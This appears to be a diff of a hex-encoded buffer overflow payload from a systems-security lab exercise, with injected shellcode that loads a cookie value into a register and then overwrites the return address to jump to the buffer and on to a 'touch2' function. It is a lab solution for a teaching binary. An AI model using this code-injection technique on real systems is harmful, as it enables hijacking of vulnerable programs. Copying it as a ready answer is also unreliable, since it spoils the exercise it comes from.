@@ -1,8 +1,7 @@
-bf fa 97 b9 59
-c3
-ff ff ff ff
-ff ff ff ff ff ff ff ff ff ff
-ff ff ff ff ff ff ff ff ff ff
-ff ff ff ff ff ff ff ff ff ff
-78 dc 61 55 00 00 00 00
-ec 17 40 00 00 00 00 00
+48 c7 c7 fa 97 b9 59 c3 /* movq 0x59b997fa,%rdi; ret; */
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+78 dc 61 55 00 00 00 00 /* start of buffer */
+ec 17 40 00 00 00 00 00 /* touch2 */
